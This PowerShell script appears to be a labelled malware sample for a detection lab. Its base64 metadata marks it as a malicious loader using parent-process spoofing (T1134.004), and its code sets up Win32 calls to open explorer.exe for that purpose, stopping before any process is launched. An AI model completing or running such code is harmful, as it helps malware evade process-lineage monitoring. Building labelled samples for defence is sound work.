# lab shim: parent-process spoof (inert, never executed in the harness)
$Codec_7d31 = 'base64|identity|'
$Material_7d31 = 'dj0zfGxhbmd1YWdlPXBvd2Vyc2hlbGx8cm9sZT1sb2FkZXJ8dmVyZGljdD1tYWxpY2lvdXN8YXR0YWNrPVQxMTM0LjAwNHxhZGFwdGVyPXdpbjMyX2FwaXxzdGFnZV9jb3VudD0xfHN0ZXBzPW9wZW5fcGFyZW50LHNwb29mX3BhcmVudCxkaXNwYXRjaF9wcm9jZXNzfGNhbXBhaWduX2lkPVBQLTdkMzFjMGUyfG5leHRfc3RhZ2U9QzpcVXNlcnNcUHVibGljXHBwN2QuZXhl'
Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public static class Pp {
  [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFOEX { public STARTUPINFO StartupInfo; public IntPtr lpAttributeList; }
  [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; }
  [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int pid);
  [DllImport("kernel32.dll")] public static extern bool InitializeProcThreadAttributeList(IntPtr l, int c, int f, ref IntPtr s);
  [DllImport("kernel32.dll")] public static extern bool UpdateProcThreadAttribute(IntPtr l, uint f, IntPtr attr, IntPtr v, IntPtr cb, IntPtr p, IntPtr r);
  [DllImport("kernel32.dll")] public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool ih, uint flags, IntPtr env, string dir, ref STARTUPINFOEX si, out IntPtr pi);
}
"@
$parent = Get-Process explorer | Select-Object -First 1
$h = [Pp]::OpenProcess(0x0080, $false, $parent.Id)
$PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
$EXTENDED_STARTUPINFO_PRESENT = 0x00080000
